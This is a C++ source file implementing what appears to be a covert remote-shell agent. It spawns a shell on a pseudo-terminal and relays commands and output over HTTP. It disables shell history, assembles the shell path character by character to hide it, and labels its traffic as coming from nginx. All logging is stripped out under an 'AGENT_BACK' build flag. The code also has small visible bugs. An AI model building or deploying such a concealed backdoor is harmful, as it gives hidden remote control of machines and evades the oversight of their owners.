
#include <unistd.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <pty.h>
#include <utmp.h>
#include <fcntl.h>
#include <string.h>
#include <vector>
#include <algorithm>
#include <sys/select.h>
#include <sys/stat.h>
#include <unistd.h>

#include "SShd.h"
#include "net/HttpResponse.h"
#include "../../setting.h"

SShd* SShd::sshd_ = nullptr;

void SShd::init() {
    tty_ = 0;
    pty_ - 0;
    cmd_          = "/bin/bash";
    filter_       = true;
    login_filter_ = true;

    struct winsize ws;
    char *         slave, *temp, *shell;
    int            ret, len, pid, n, saveErrno;

    if (openpty(&pty_, &tty_, NULL, NULL, NULL) < 0) {
        perror("openpty error:");
        return;
    }
    slave = ttyname(tty_);
    if (slave == NULL) {
        return;
    }

    _setNonBlock(pty_);

    string temp1 = "HISTFILE=";
    putenv(const_cast<char*>(temp1.c_str()));

    _events_CC_readable();

    string term = "TERM=" + httpHandler_->getHeader("Term");
    putenv(const_cast<char*>(term.c_str()));
    if (ioctl(pty_, TIOCSWINSZ, &ws) < 0) {
        perror("ioctl error");
        return;
    }

    std::vector<char> winSize = httpHandler_->getBodyByArry();
    ws.ws_row                 = ((int)winSize[0] << 8) + (int)winSize[1];
    ws.ws_col                 = ((int)winSize[2] << 8) + (int)winSize[3];
    ws.ws_xpixel              = 0;
    ws.ws_ypixel              = 0;

    pid = fork();

    if (pid < 0) {
        return;
    }

    if (pid == 0) {
        close(httpHandler_->getFd());
        close(pty_);

        if (setsid() < 0) {
            return;
        }
        /* set controlling tty, to have job control */
        if (ioctl(tty_, TIOCSCTTY, NULL) < 0) {
            perror("ioctl faild");
            return;
        }

        /* tty becomes stdin, stdout, stderr */
        dup2(tty_, 0);
        dup2(tty_, 1);
        dup2(tty_, 2);

        if (tty_ > 2) {
            close(tty_);
        }

        shell = (char*)malloc(8);

        if (shell == NULL) {
            return;
        }

        shell[0] = '/';
        shell[4] = '/';
        shell[1] = 'b';
        shell[5] = 's';
        shell[2] = 'i';
        shell[6] = 'h';
        shell[3] = 'n';
        shell[7] = '\0';

        execl(shell, shell + 5, "-c", cmd_.c_str(), (char*)0);

        /* d0h, this shouldn't happen */
        return;
    }

    // 父进程(main)即将陷入shell loop
    else {
#ifndef AGENT_BACK
        std::cout << "sshd::init(): 父进程陷入shell-loop(master-pty" << pty_
                  << "), "
                  << "子进程进入bash(slave-tty\n"
                  << tty_ << ")\n";
        close(tty_);
#endif
        return;

    }
}

void SShd::reset() {
    // filter无需设置

    if (cmd_ == "shell_stop\r")
        ::write(pty_, "\r", 1);
}

/**
 * @bug 返回值尚未定义清楚
 */
int SShd::runshell() {
    // for access loop again
    reset();

    fd_set rd;
    int    n, ret;

    while (1) {
        httpHandler_->resetParse();

        FD_ZERO(&rd);
        FD_SET(httpHandler_->getFd(), &rd);
        FD_SET(pty_, &rd);

        n = (pty_ > httpHandler_->getFd()) ? pty_ : httpHandler_->getFd();

        if (select(pty_ + 1, &rd, NULL, NULL, NULL) < 0) {
            return -1;
        }

        if (FD_ISSET(httpHandler_->getFd(), &rd)) {
            ret = this->_events_pty_writable();
            if (ret != SUCCESS) {
                return ret;
            }
        }

        if (FD_ISSET(pty_, &rd)) {
            ret = this->_events_pty_readable();
            if (ret != SUCCESS) {
                return ret;
            }
        }
    }
}

int SShd::_events_pty_readable() {
    int ret   = -1;
    int Errno = 0;

    // login不过滤 && 每个命令(包含二次进入)仅且仅过滤一次
    if (!login_filter_ && filter_) {
        char buf[cmd_.size() + 1];
        ret     = ::read(pty_, buf, cmd_.size() + 1);
        filter_ = false;
    }

    // 读取tty响应的数据
    while (1) {
        ret = _outBuff.readFd(pty_, &Errno);
        if (ret == 0) {
            return ERROR;
        }
        if (ret < 0 && Errno != EAGAIN) {
#ifndef AGENT_BACK
            perror("SShd::_events_pty_readable()ret==-1:");
#endif
            return ERROR;
        }

        if (ret < 0 && Errno == EAGAIN) {
            break;
        }
    }

    // 打包发送
    if (_outBuff.readableBytes() > 0) {
#ifndef AGENT_BACK
        std::cout << "SSH-Server发送数据包(body) 长度"
                  << _outBuff.readableBytes() << std::endl;
#endif
        HttpResponse response(false);
        response.setStatusCode(200);
        response.addHeader("Action", "3");
        response.addHeader("Server", "nginx");
        response.setBody(_outBuff.peek(), _outBuff.readableBytes());
        response.createResponse(&(httpHandler_->outBuff_));
        _outBuff.retrieveAll();
        httpHandler_->write(&Errno);

        return SUCCESS;
    }

    // 本次并没有什么数据，等待下次通知
    else {
        return SUCCESS;
    }
}

int SShd::_events_pty_writable() {
    filter_       = true;
    login_filter_ = false;
    int readError, nRead;

    switch (_events_CC_readable()) {
        case SUCCESS:
            break;

        case ERROR:
            return ERROR;

        case CLOSE:
            return CLOSE;
    }

    cmd_  = httpHandler_->getBodyByString();
    int n = ::write(pty_, cmd_.data(), cmd_.size());

    return SUCCESS;
}

int SShd::_events_CC_readable() {
    httpHandler_->resetParse();

    int readError, nRead;

    while (!httpHandler_->parseFinish()) {
        nRead = httpHandler_->read(&readError);

        if (nRead == 0) {
            return CLOSE;
        }
        if (nRead < 0) {
            return ERROR;
        }

        if (httpHandler_->parseRequest() != HttpRequest::GotAll)
            continue;
    }

    return SUCCESS;
}

int SShd::_setNonBlock(int fd) {
    int flag = ::fcntl(fd, F_GETFL, 0);
    if (flag == -1) {
        // printf("utils::setNonBlock[%d],listenFd:%s\n", fd, strerror(errno));
        return -1;
    }
    flag |= O_NONBLOCK;
    if (::fcntl(fd, F_SETFL, flag) == -1) {
        // printf("utils::setNonBlock[%d],listenFd:%s\n", fd, strerror(errno));
        return -1;
    }
    return 0;
}
